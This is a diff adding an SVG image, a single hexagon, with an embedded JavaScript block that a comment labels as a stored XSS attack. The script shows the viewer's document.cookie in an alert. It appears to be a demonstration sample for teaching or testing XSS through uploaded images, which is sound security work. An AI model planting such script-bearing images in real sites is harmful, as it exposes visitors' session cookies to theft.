@@ -1,0 +1,23 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<svg
+        xmlns:dc="http://purl.org/dc/elements/1.1/"
+        xmlns:cc="http://creativecommons.org/ns#"
+        xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+        xmlns:svg="http://www.w3.org/2000/svg"
+        xmlns="http://www.w3.org/2000/svg"
+        width="500"
+        height="500"
+        viewBox="0 0 198.4375 52.916666"
+        version="1.1">
+  <g
+          transform="translate(-9.8676114,4.8833333)">
+    <path
+            d="m 107.79557,-10.430538 -7.33315,-0.02213 -3.647402,-6.361755 3.685742,-6.339624 7.33314,0.02213 3.64741,6.361756 z"
+            style="fill:#131f6b;fill-opacity:1;stroke-width:0.05937638"
+            transform="scale(1,-1)" />
+    <!-- The below lines were added in a text editor to the image XML. This is the stored XSS attack. -->
+    <script type="text/javascript">
+      alert("This is an example of a stored XSS attack in an SVG image, here's the cookie: " + document.cookie);
+    </script>
+  </g>
+</svg>
